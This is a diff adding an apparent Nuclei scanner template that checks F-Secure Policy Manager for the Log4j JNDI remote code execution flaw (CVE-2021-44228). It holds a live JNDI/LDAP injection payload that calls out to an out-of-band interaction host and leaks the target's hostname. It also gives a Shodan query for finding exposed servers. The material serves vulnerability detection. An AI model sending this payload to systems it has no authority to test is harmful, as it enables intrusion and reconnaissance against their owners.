@@ -1,0 +1,62 @@
+id: f-secure-policymanager-log4j-rce
+
+info:
+  name: F-Secure Policy Manager - Remote Code Execution (Apache Log4j)
+  author: shaikhyaser
+  severity: critical
+  description: |
+    F-Secure Policy Manager is susceptible to Log4j JNDI remote code execution.
+  reference:
+    - https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"F-Secure Policy Manager"
+  tags: cve,cve2021,rce,jndi,log4j,fsecure,oast,kev
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+  str: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        GET /fsms/fsmsh.dll?FSMSCommand=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}} HTTP/1.1
+        Host: {{Hostname}}
+        Referrer: {{RootURL}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+
+    extractors:
+      - type: kval
+        kval:
+          - interactsh_ip # Print remote interaction IP in output
+
+      - type: regex
+        group: 2
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print injection point in output
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+          - '\d{6}\.([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+' # Print extracted ${:-{{rand1}}}${:-{{rand2}}}.${hostName} in output
+        part: interactsh_request
+
+# digest: 4a0a004730450220309d02fb2a14af51d6b3dd296b9d421619f900f7fea1ae7771ab375e5fb84f430221008b5eb4ddb57371bdd686e15e931342efb73e102e7539625e6f22a8c8fafc2548:922c64590222798bb761d5b6d8e72950
